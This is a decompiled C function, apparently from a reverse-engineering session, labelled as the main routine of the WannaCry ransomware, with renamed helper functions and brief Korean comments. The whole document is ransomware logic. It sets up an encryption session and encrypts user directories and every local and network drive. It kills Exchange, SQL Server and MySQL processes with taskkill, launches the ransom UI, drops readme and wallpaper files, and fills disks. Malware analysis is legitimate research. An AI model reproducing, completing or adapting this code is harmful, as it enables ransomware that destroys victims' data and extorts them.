// --- Metadata ---
// Function Name: WannaCryMainRoutine_100057C0
// Address: 0x100057C0
// Exported At: 20250522_122522
// Signature: unknown_signature
// ---------------
void WannaCryMainRoutine_100057C0()
{
  int v0; // esi
  DWORD v1; // ebx
  int i; // edi
  LONG j; // esi
  BOOL v4; // esi
  int k; // esi
  int v6; // [esp+4h] [ebp-D44h]
  WCHAR RootPathName[2]; // [esp+8h] [ebp-D40h] BYREF
  int v8; // [esp+Ch] [ebp-D3Ch]
  WCHAR v9[2]; // [esp+10h] [ebp-D38h] BYREF
  int v10; // [esp+14h] [ebp-D34h]
  char Buffer[1024]; // [esp+18h] [ebp-D30h] BYREF
  _DWORD Parameter[585]; // [esp+418h] [ebp-930h] BYREF
  int v13; // [esp+D44h] [ebp-4h]

  initMainObject_10001590(Parameter);
  v0 = 0;
  v13 = 0;
  if ( !initCryptoSession_10001830(             // 설정 및 초기화 
          Parameter,
          pky_1000DD24,
          (int)LogMessageAndAccumulateSize_10005340,
          (int)&isImportKeySuccess_1000DD8C) )
    goto LABEL_35;
  if ( GetFileAttributesA("f.wnry") == -1 )
    storeTwoValues_100018F0(Parameter, 10, 100);
  if ( !dword_1000DCC8 )
  {
    dword_1000DCC8 = time(0);
    writeCryptrandomToRes_10004730();
    sprintf(Buffer, "%s fi", "@WanaDecryptor@.exe");// 랜섬UI 실행 
    RunProcessWithTimeout_10001080(Buffer, 0x186A0u, 0);
    CwnryIO_10001000(&unk_1000D958, 1);
  }
  EnsureWanaDecryptorAndShortcut_10004CD0();    // 암호화 루틴 실행 
  createReadMe_10004DF0();
  encryptUserDirectories_10005480(Parameter);
  if ( isImportKeySuccess_1000DD8C )
    goto LABEL_35;
  while ( 2 )
  {
    InterlockedExchange(&Target, -1);
    v6 = v0 + 1;
    if ( v0 == 1 )
    {
      RunProcessWithTimeout_10001080("taskkill.exe /f /im Microsoft.Exchange.*", 0, 0);// 백그라운드 서비스 종료 
      RunProcessWithTimeout_10001080("taskkill.exe /f /im MSExchange*", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im sqlserver.exe", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im sqlwriter.exe", 0, 0);
      RunProcessWithTimeout_10001080("taskkill.exe /f /im mysqld.exe", 0, 0);
    }
    v1 = GetLogicalDrives();
    for ( i = 0; i < 2; ++i )
    {
      for ( j = 25; j >= 2; --j )
      {
        RootPathName[1] = HIWORD(dword_1000D7A4);
        RootPathName[0] = j + 65;
        v8 = dword_1000D7A8;
        if ( isImportKeySuccess_1000DD8C )
          break;
        if ( ((v1 >> j) & 1) != 0 )
        {
          if ( i )
          {
            if ( i == 1 && GetDriveTypeW(RootPathName) != 4 )
              continue;
LABEL_20:
            CheckDriveAndEncryptFiles_10005540((int)Parameter, j, 1);
            continue;
          }
          if ( GetDriveTypeW(RootPathName) != 4 )
            goto LABEL_20;
        }
      }
    }
    InterlockedExchange(&Target, -1);
    ScanUserDirs_10004A40(25, (int)SetupWallpaperAndDrop_10004F20, 0);
    v4 = dword_1000DCE0 == 0;
    if ( !dword_1000DCE0 )
    {
      sprintf(Buffer, "%s co", "@WanaDecryptor@.exe");
      RunProcessWithTimeout_10001080(Buffer, 0, 0);
    }
    dword_1000DCE0 = time(0);
    writeCryptrandomToRes_10004730();
    if ( v6 == 1 )
    {
      sprintf(Buffer, "cmd.exe /c start /b %s vs", "@WanaDecryptor@.exe");
      RunProcessWithTimeout_10001080(Buffer, 0, 0);
    }
    if ( v4 )
    {
      WriteMarkerAndFillDisk_10005190(2);
      for ( k = 25; k > 2; --k )
      {
        if ( isImportKeySuccess_1000DD8C )
          break;
        if ( ((v1 >> k) & 1) != 0 )
        {
          v9[1] = HIWORD(dword_1000D7A4);
          v10 = dword_1000D7A8;
          v9[0] = k + 65;
          if ( GetDriveTypeW(v9) == 3 )
            WriteMarkerAndFillDisk_10005190(k);
        }
      }
    }
    Sleep(0xEA60u);
    if ( !isImportKeySuccess_1000DD8C )
    {
      v0 = v6;
      continue;
    }
    break;
  }
LABEL_35:
  v13 = -1;
  CryptoObject_Destructor_10001680((char *)Parameter);
}
